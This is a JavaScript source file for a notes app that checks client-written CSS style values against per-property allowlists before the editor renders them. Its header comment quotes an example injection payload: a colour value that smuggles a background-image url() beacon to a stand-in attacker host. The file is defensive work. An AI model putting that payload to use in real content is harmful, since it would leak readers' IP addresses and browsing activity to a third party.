// 246:B1 — THE boundary between a client-written value and a CSS declaration.
//
// A note's content is a JSON document the CLIENT writes, and `PATCH /api/notes/[id]` stores it
// unchanged. Tiptap's style marks interpolate their attribute values straight into a `style`
// attribute at render time, so before this existed, content JSON carrying
// `{ color: "red;background-image:url(https://evil.test/beacon)" }` rendered as
//   <span style="color: red; background-image: url("https://evil.test/beacon");">
// — an arbitrary CSS declaration list, i.e. a beacon that fires when the note is RENDERED and
// leaks to a third party that the note was opened, with the reader's IP and user-agent. Measured
// live 2026-09-12 for color, background-color, font-size, font-family, highlight and text-align.
//
// WHY THE GUARD IS HERE AND NOT AT PARSE. Parsing pasted HTML is already safe: the browser's CSSOM
// reduces `color:red;background-image:url(evil)` to `red` before any extension sees it. But that
// only protects the PASTE route. The API takes the whole document as JSON, and the coming Evernote
// importer will BUILD JSON rather than paste HTML — so parse-time validation would have guarded the
// one route that was never exposed. Render is the single point every route passes through. Same
// lesson as 123:B1: the path that was measured was safe, and the exposure was on the path that
// was not.
//
// 247: `color` accepts one more SHAPE — a semantic token from the closed vocabulary in
// lib/note-colours.js — and the direction of travel is what keeps that safe. The client supplies a
// KEY; the CSS that comes out (`var(--note-fg-red, #b91c1c)`) is authored by this app. So the
// allowlist is NOT widened to admit `var()` from content, which would let a note name any custom
// property the app defines. A client-written `var(--x)` is refused exactly as it was before.
//
// ALLOWLIST PER PROPERTY, never a denylist. A denylist of `url(`, `expression(`, `\` and friends
// has to keep pace with CSS forever, and two drifting lists for one concept is the shape that
// produced 10:B2 and 222. Anything not positively recognised returns null, and a null value means
// the caller OMITS the declaration — never emits a partial or guessed one.

import { themeTextColourCss } from './note-colours.js';

// #rgb / #rgba / #rrggbb / #rrggbbaa; a functional colour whose interior is only digits,
// separators and percent (so it cannot carry another declaration or a url()); or a bare run of
// letters, which covers every CSS named colour plus `inherit`, `transparent` and `currentcolor`
// and cannot inject anything, since `;`, `(`, `{`, `:` and `\` are all outside the class.
const COLOUR = /^(#(?:[0-9a-f]{3}|[0-9a-f]{4}|[0-9a-f]{6}|[0-9a-f]{8})|(?:rgb|rgba|hsl|hsla)\([0-9.,%/ ]*\)|[a-z]+)$/i;

// A plain number and a unit. Deliberately excludes calc() — it takes an expression, and an
// expression is exactly what this function exists to refuse.
const LENGTH = /^\d+(?:\.\d+)?(?:px|pt|em|rem|%)$/i;

// Family names, the generic families, and the quotes a multi-word family needs. No parens (no
// url()), no semicolon, no colon, no backslash (no CSS escapes, which could re-introduce one).
const FAMILY = /^[a-z0-9 ,._'"-]+$/i;

// An exact enum: the only four values the editor can produce, matched case-sensitively.
const ALIGN = new Set(['left', 'center', 'right', 'justify']);

// A text colour this app's palette owns renders as a per-theme custom property rather than the
// literal the author picked — see lib/note-colours.js for why no single literal can be AA in both
// themes. Scoped to `color` alone: --note-fg-* are FOREGROUND shades, and handing one to
// `background-color` would be a token used for a job it was never measured against (246:v0.64.1).

const RULES = {
  color: (v) => themeTextColourCss(v) ?? (COLOUR.test(v) ? v : null),
  'background-color': (v) => (COLOUR.test(v) ? v : null),
  'font-size': (v) => (LENGTH.test(v) ? v : null),
  'font-family': (v) => (FAMILY.test(v) ? v : null),
  'text-align': (v) => (ALIGN.has(v) ? v : null)
};

// Returns the value to use, or null meaning "emit no declaration at all". Fails closed on an
// unknown property: a property with no rule must never become a free-text CSS declaration, because
// that is the whole vulnerability with an extra step.
export function sanitiseStyleValue(property, value) {
  if (typeof value !== 'string') return null;
  const rule = RULES[property];
  if (!rule) return null;
  return rule(value.trim());
}

// Convenience for a renderHTML that builds one declaration: returns `` or `prop: value;`.
export function styleDeclaration(property, value) {
  const safe = sanitiseStyleValue(property, value);
  return safe === null ? '' : `${property}: ${safe};`;
}
